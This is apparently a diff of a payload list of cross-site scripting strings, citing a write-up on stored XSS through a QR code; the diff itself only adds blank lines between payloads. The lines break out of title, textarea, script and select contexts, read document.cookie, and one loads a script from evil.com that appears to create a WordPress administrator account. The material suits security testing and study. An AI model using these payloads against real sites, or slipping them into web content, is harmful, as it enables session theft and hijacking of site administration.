@@ -13,14 +13,24 @@ https://sapt.medium.com/stored-xss-non-privileged-user-to-anyone-using-qr-code-d
 Payload
 
     onclick=prompt(document.cookie);
+    
     </title><svg onload="alert(1)"></title>
+    
     <textarea>hi</textarea><svg onload="alert(1)"></textarea>
+    
     <script> let q= 'hi</script><svg onload="alert(1)">';</script>
+    
     <script>alert("1")</script>
+    
     <select><option value="1">en</option></select><svg onload="alert(1)"></option></select>
+    
     qwe<mg src="1>
+    
     "><img src=x onerror=alert(document.cookie)>
+    
     " oneerror="alert(1337)">qwe
+    
     car<img src=1 with="" color=""black=""onerror=alert(1)>
+    
     <script src="http://evil.com/wordpress_create_admin_user.js"></script>
 
